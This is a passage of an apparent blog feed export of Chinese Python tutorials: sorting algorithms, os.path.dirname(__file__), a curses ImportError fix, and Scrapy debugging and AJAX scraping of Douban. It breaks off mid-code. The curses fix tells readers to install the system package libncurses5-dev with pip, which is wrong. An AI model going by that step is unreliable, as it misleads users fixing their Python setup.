class="params">alist, first, last</span>):</span><br><span class="line">    pivotvalue = alist[first]</span><br><span class="line"></span><br><span class="line">    leftmark = first + <span class="number">1</span></span><br><span class="line">    rightmark = last</span><br><span class="line"></span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        <span class="keyword">while</span> leftmark &lt;= rightmark <span class="keyword">and</span> alist[leftmark] &lt;= pivotvalue:</span><br><span class="line">            leftmark += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> alist[rightmark] &gt;= pivotvalue <span class="keyword">and</span> rightmark &gt;= leftmark:</span><br><span class="line">            rightmark -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> rightmark &lt; leftmark:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = alist[leftmark]</span><br><span class="line">            alist[leftmark] = alist[rightmark]</span><br><span class="line">            alist[rightmark] = temp</span><br><span class="line"></span><br><span class="line">    temp = alist[first]</span><br><span class="line">    alist[first] = alist[rightmark]</span><br><span class="line">    alist[rightmark] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rightmark</span><br></pre></td></tr></table></figure>
<h3 id="可视化-4"><a href="#可视化-4" class="headerlink" title="可视化"></a>可视化</h3><p>下图是以最后一项为枢轴值：<br><img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Sorting_quicksort_anim.gif"><br>视频中以第一项为枢轴值：</p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM2MjgwMA==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h3 id="工作原理-5"><a href="#工作原理-5" class="headerlink" title="工作原理"></a>工作原理</h3><p>归并操作（merge），也叫归并算法，指的是将两个已经排序的序列合并成一个序列的操作。归并排序算法依赖归并操作。<br>步骤如下：</p>
<ol>
<li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li>
<li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li>
<li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li>
<li>重复步骤3直到某一指针到达序列尾；</li>
<li>将另一序列剩下的所有元素直接复制到合并序列尾。</li>
</ol>
<h3 id="复杂度-5"><a href="#复杂度-5" class="headerlink" title="复杂度"></a>复杂度</h3><table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(NlogN)</td>
<td>O(NlogN)</td>
<td>O(NlogN)</td>
<td>O(N)</td>
<td>稳定</td>
</tr>
</tbody></table>
<h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(alist) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = <span class="built_in">len</span>(alist) // <span class="number">2</span></span><br><span class="line">        left_half = alist[:mid]</span><br><span class="line">        right_half = alist[mid:]</span><br><span class="line"></span><br><span class="line">        merge_sort(left_half)</span><br><span class="line">        merge_sort(right_half)</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(left_half) <span class="keyword">and</span> j &lt; <span class="built_in">len</span>(right_half):</span><br><span class="line">            <span class="keyword">if</span> left_half[i] &lt; right_half[j]:</span><br><span class="line">                alist[k] = left_half[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                alist[k] = right_half[j]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(left_half):</span><br><span class="line">            alist[k] = left_half[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(right_half):</span><br><span class="line">            alist[k] = right_half[j]</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> alist</span><br></pre></td></tr></table></figure>
<h3 id="可视化-5"><a href="#可视化-5" class="headerlink" title="可视化"></a>可视化</h3><p><img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Merge_sort_animation2.gif"></p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM2MTkxMg==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h2><p>不同的排序算法听起来是什么样的？</p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNDg5MDY4OA==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://zh.wikipedia.org/">中文维基百科</a></li>
<li><a href="https://www.youtube.com/user/AlgoRythmics">AlgoRythmics - YouTube</a></li>
<li><a href="https://www.youtube.com/watch?v=t8g-iYGHpEA">What different sorting algorithms sound like</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中os.path.dirname(__file__)的用法</title>
    <url>/2016/09/12/Python%E4%B8%ADos-path-dirname-file-%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="os-path-dirname-的用途"><a href="#os-path-dirname-的用途" class="headerlink" title="os.path.dirname()的用途"></a>os.path.dirname()的用途</h1><p><code>os.path.dirname()</code>用来获取文件的路径。<br>如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.dirname(<span class="string">&#x27;/home/woodenrobot/Documents/LearnPython/test.py&#x27;</span>)</span><br><span class="line">/home/woodenrobot/Documents/LearnPython</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h1 id="os-path-dirname-file-的用途"><a href="#os-path-dirname-file-的用途" class="headerlink" title="os.path.dirname(file)的用途"></a>os.path.dirname(<strong>file</strong>)的用途</h1><p>而<code>os.path.dirname(__file__)</code>是用来获取python文件运行时的路径。<br>比如有一个test.py脚本内容为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.path.dirname(__file__))</span><br></pre></td></tr></table></figure>
<p>该脚本位于<code>/home/woodenrobot/Documents/LearnPython</code>文件夹中，分两种情况说明：</p>
<h2 id="1-当程序脚本以完整路径运行时"><a href="#1-当程序脚本以完整路径运行时" class="headerlink" title="1.当程序脚本以完整路径运行时"></a>1.当程序脚本以完整路径运行时</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(trusty)woodenrobot@localhost:~$ python /home/woodenrobot/Documents/LearnPython/test.py</span><br><span class="line">/home/woodenrobot/Documents/LearnPython</span><br></pre></td></tr></table></figure>
<p>此时会输出该脚本所在的完整路径。</p>
<h2 id="2-当程序脚本以相对路径运行时"><a href="#2-当程序脚本以相对路径运行时" class="headerlink" title="2.当程序脚本以相对路径运行时"></a>2.当程序脚本以相对路径运行时</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(trusty)woodenrobot@localhost:~/Documents$ python LearnPython/test.py</span><br><span class="line">LearnPython</span><br><span class="line">(trusty)woodenrobot@localhost:~/Documents/LearnPython$ python test.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时则会输出其相对路径或空目录。</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>当你在python自带的IDLE或者python command line中使用会出现以下错误：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.<span class="built_in">path</span>.dirname(__file__)</span><br><span class="line">Traceback (most recent <span class="keyword">call</span> last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="function">NameError: <span class="title">name</span> &#x27;<span class="title">__file__</span>&#x27; <span class="title">is</span> <span class="title">not</span> <span class="title">defined</span></span></span><br></pre></td></tr></table></figure>
<p>这是因为此时该段程序并不是从文件夹中运行的，所以并未生成<code>__file__</code>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="http://www.th7.cn/Program/Python/201303/130549.shtml">Python零碎知识(9):有关 os.path.dirname(<strong>file</strong>)</a></li>
<li><a href="http://blog.csdn.net/lxjames833539/article/details/5251608">python中os.path.dirname(<strong>file</strong>)的使用</a></li>
<li><a href="http://www.cnblogs.com/BeginMan/p/3327291.html">Python 模块学习：os模块</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python无法使用curses库解决方案</title>
    <url>/2016/09/10/Python%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8curses%E5%BA%93%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h1 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ImportError: No module named <span class="string">&#x27;_curses&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><p>1.ubuntu 14.04<br>2.python 3.5</p>
<span id="more"></span>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>1.<code>ctrl+alt+t</code>打开终端输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install libncurses5-dev</span><br></pre></td></tr></table></figure>
<p>2.安装完毕后进入<a href="https://www.python.org/getit/">python官网</a>下载python源文件进行重新编译。<br>3.解压下载好的python源文件，在该文件内打开终端依次输入下列代码进行编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>4.最后使用在<code>/usr/local/bin</code>文件夹里重新编译好的<code>pytho3.5</code>主程序即可解决问题。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="">https://bugs.python.org/issue17704</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy爬虫框架教程（三）-- 调试(Debugging)Spiders</title>
    <url>/2017/02/12/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89-%E8%B0%83%E8%AF%95-Debugging-Spiders/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>春节放假在老家没有网，所以最近没有更新。这周加班闲暇抽空赶紧来更新一篇。我们在写爬虫的时候经常需要修改xapth规则来获取所需的数据，而Scrapy的爬虫通常是在命令行中启动的，我们怎么去调试呢？下面我就为大家介绍两种我常用的方法。</p>
<span id="more"></span>

<h1 id="工具和环境"><a href="#工具和环境" class="headerlink" title="工具和环境"></a>工具和环境</h1><ol>
<li>语言：python 2.7</li>
<li>IDE： Pycharm</li>
<li>浏览器：Chrome</li>
<li>爬虫框架：Scrapy 1.2.1</li>
</ol>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>通过 scrapy.shell.inspect_response 函数来实现。以<a href="http://woodenrobot.me/2017/01/07/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250/">上一篇教程</a>的爬虫为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time     : 2017/1/7 17:04</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanMovieTop250Spider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safar&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;i/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span></span><br><span class="line">        <span class="keyword">yield</span> Request(url, headers=self.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 命令行调试代码</span></span><br><span class="line">        <span class="keyword">from</span> scrapy.shell <span class="keyword">import</span> inspect_response</span><br><span class="line">        inspect_response(response, self)</span><br><span class="line">        </span><br><span class="line">        item = DoubanMovieItem()</span><br><span class="line">        movies = response.xpath(<span class="string">&#x27;//ol[@class=&quot;grid_view&quot;]/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">            item[<span class="string">&#x27;ranking&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;pic&quot;]/em/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;movie_name&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;hd&quot;]/a/span[1]/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span[@class=&quot;rating_num&quot;]/text()&#x27;</span></span><br><span class="line">            ).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&#x27;score_num&#x27;</span>] = movie.xpath(</span><br><span class="line">                <span class="string">&#x27;.//div[@class=&quot;star&quot;]/span/text()&#x27;</span>).re(u<span class="string">r&#x27;(\d+)人评价&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;//span[@class=&quot;next&quot;]/a/@href&#x27;</span>).extract()</span><br><span class="line">        <span class="keyword">if</span> next_url:</span><br><span class="line">            next_url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span> + next_url[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">yield</span> Request(next_url, headers=self.headers)</span><br></pre></td></tr></table></figure>
<p>我们在下载完网页源码进行解析前可以插入上述两句代码，在命令行运行爬虫出现以下效果：<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212152655.png"><br>此时我们就可以在命令行中使用xpath规则对response进行操作提取相应的信息：<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212153129.png"><br>有时候下载下来的网页结构和浏览器中看到的不一样，我们可以利用<code>view(response)</code>将爬虫下载到的网页源码在浏览器中打开：<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212153609.png"><br>在命令行输入<code>view(response)</code>后默认浏览器会自动打开下载到的网页源码。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212153634.png"><br>虽然scrapy自己提供了这个方式让我们调试自己的爬虫，但是这个方式有很大的局限性。如果能利用pycharm的Debug功能进行调试就太好了。下面我就为大家介绍这么用pycharm调试自己的爬虫。  </p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>首先在setting.py同级目录下创建run.py文件。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212154126.png"><br>写入以下代码：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time     : 2017/1/1 17:51</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> cmdline</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;douban_movie_top250&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;scrapy crawl &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">cmdline.execute(cmd.split())</span><br></pre></td></tr></table></figure>
<p>其中<code>name</code>参数为spider的name。<br>接着在spider文件中设置断点。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212154545.png"><br>返回<code>run.py</code>文件中右键选择Debug。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212154625.png"><br>最后程序就会在断点处暂停，我们就可以查看相应的内容从而进行调试<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89--%20%E8%B0%83%E8%AF%95(Debugging)SpidersQQ%E5%9B%BE%E7%89%8720170212154711.png"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>两种方法适合不同的场景，不过一般情况下肯定是方法2好用。: )  </p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy爬虫框架教程（四）-- 抓取AJAX异步加载网页</title>
    <url>/2017/04/09/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89-%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B5/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/24669128?group_id=834424262096994304">Scrapy爬虫框架教程（一）– Scrapy入门</a><br><a href="https://zhuanlan.zhihu.com/p/24769534">Scrapy爬虫框架教程（二）– 爬取豆瓣电影TOP250</a><br><a href="https://zhuanlan.zhihu.com/p/25200262">Scrapy爬虫框架教程（三）– 调试(Debugging)Spiders</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间工作太忙一直没有时间继续更新这个教程，最近离职了趁着这段时间充裕赶紧多写点东西。之前我们已经简单了解了对普通网页的抓取，今天我就给大家讲一讲怎么去抓取采用Ajax异步加的网站。</p>
<span id="more"></span>

<h1 id="工具和环境"><a href="#工具和环境" class="headerlink" title="工具和环境"></a>工具和环境</h1><ol>
<li>语言：python 2.7</li>
<li>IDE： Pycharm</li>
<li>浏览器：Chrome</li>
<li>爬虫框架：Scrapy 1.3.3</li>
</ol>
<h1 id="什么是AJAX"><a href="#什么是AJAX" class="headerlink" title="什么是AJAX?"></a>什么是AJAX?</h1><blockquote>
<p>AJAX即“Asynchronous Javascript And XML”（异步JavaScript和XML），是指一种创建交互式网页应用的网页开发技术。  </p>
<p>AJAX = 异步 JavaScript和XML（标准通用标记语言的子集）。  </p>
<p>AJAX 是一种用于创建快速动态网页的技术。  </p>
<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
</blockquote>
<h1 id="两个Chrome插件"><a href="#两个Chrome插件" class="headerlink" title="两个Chrome插件"></a>两个Chrome插件</h1><h2 id="Toggle-JavaScript"><a href="#Toggle-JavaScript" class="headerlink" title="Toggle JavaScript"></a>Toggle JavaScript</h2><p>这个插件可以帮助我们快速直观地检测网页里哪些信息是通过AJAX异步加载而来的，具体怎么用，下面会详细讲解。<br>chrome商店下载地址：<a href="https://chrome.google.com/webstore/detail/toggle-javascript/cidlcjdalomndpeagkjpnefhljffbnlo?utm_source=chrome-app-launcher-info-dialog">https://chrome.google.com/webstore/detail/toggle-javascript/cidlcjdalomndpeagkjpnefhljffbnlo?utm_source=chrome-app-launcher-info-dialog</a>(Ps:打不的小伙伴自行百度搜索国内提供chrome插件下载的网站离线安装)</p>
<h2 id="JSON-handle"><a href="#JSON-handle" class="headerlink" title="JSON-handle"></a>JSON-handle</h2><p>这个插件可以帮我们格式化Json串,从而让我们以一个更友好的方式查看Json内的信息。<br>chrome商店下载地址：<a href="https://chrome.google.com/webstore/detail/json-handle/iahnhfdhidomcpggpaimmmahffihkfnj">https://chrome.google.com/webstore/detail/json-handle/iahnhfdhidomcpggpaimmmahffihkfnj</a>(Ps:打不的小伙伴自行百度搜索国内提供chrome插件下载的网站离线安装)</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="分析页面是否采用AJAX"><a href="#分析页面是否采用AJAX" class="headerlink" title="分析页面是否采用AJAX"></a>分析页面是否采用AJAX</h2><p>上次我们拿了豆瓣当做例子，刚好我发现了豆瓣有AJAX异步加载的页面，这次我们就不换了，还拿豆瓣做例子。（逃<br>首先我们打<a href="https://movie.douban.com/typerank?type_name=%E5%8A%A8%E4%BD%9C&type=5&interval_id=100:90&action=">开豆瓣电影分类排行榜 - 动作片</a>栏目。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B51.1.png"><br>打开过后你有没有发现什么不一样的地方呢？如果你的网速慢你会发现下面的电影信息是在网页别的部分出现后才慢慢出现的，试着把界面往下滑会不断有新的电影信息更新出来。<br>遇到这种情况初步就可以认定这个页面是采用AJAX异步加载的，你也可以通过右键查看网页源码来鉴别。比如说你右键查看源码ctrl+f搜索这个杀手不太冷这几个字，你会发现源码里没有。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B52.png"><br>上面的方法虽然能用，但是总感觉有点笨。还记得上面推荐的那个chrome插件Toggle JavaScript吗？<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B53.png"><br>安好这个插件它就会出现在chrome浏览器的右边，试着轻轻点一下。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B54.png"><br>我的天呐！这么神奇吗？！刚才的电影信息都不见了！还记得AJAX的介绍吗？AJAX = 异步 JavaScript和XML。当我们点击了插件就代表这个我们封禁了JavaScript,这个页面里的JavaScript代码无法执行，那么通过AJAX异步加载而来的信息当然就无法出现了。通过这种方法我们能快速精确地知道哪些信息是异步加载而来的。</p>
<h2 id="如何抓取AJAX异步加载页面"><a href="#如何抓取AJAX异步加载页面" class="headerlink" title="如何抓取AJAX异步加载页面"></a>如何抓取AJAX异步加载页面</h2><p>对于这种网页我们一般会采用两种方法：</p>
<ol>
<li>通过抓包找到AJAX异步加载的请求地址；</li>
<li>通过使用PhantomJS等无头浏览器执行JS代码后再对网页进行抓取。</li>
</ol>
<p>通常情况下我会采用第一种方法，因为使用无头浏览器会大大降低抓取效率，而且第一种方法得到的数据格式往往以Json为主，非常干净。在这里我只讲解第一种方法，第二种方法作为爬虫的终极武器我会在后续的教程中进行讲解。<br>回到我们需要抓取的页面，还记得我说过页面的一个细节吗，下拉更新。进入页面后我们按F12打开chrome浏览器的开发者工具选择Network，然后实现一次下拉更新。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B55.png"><br>你会在Network里发现一个Response为Json格式的请求，仔细看看Json里的内容你会明白这些都是网页上显示的电影信息。右键该请求地址选择Open Link in New Tab,如果你装了JSON-handle插件你会以下面这种更友好的方式查看这个Json串。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B56.png"><br>接着再让我们看一该请求的Header信息。<br><img src="/images/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89--%20%E6%8A%93%E5%8F%96AJAX%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BD%91%E9%A1%B57.png"><br>首先我们可以看出这是一个get请求，多看几个下拉请求的地址后你会发现地中的start=xxx在不断变化，每次增加20。所以我们只用更改这个参数就可以实现翻页不断获取新数据(修改其他的参数也会有不同的效果，这里就不一一细说了，留给大家慢慢地探索)。<br>spider代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time     : 2017/4/9 14:32</span></span><br><span class="line"><span class="comment"># @Author   : woodenrobot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapyspider.items <span class="keyword">import</span> DoubanMovieItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubanAJAXSpider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;douban_ajax&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span 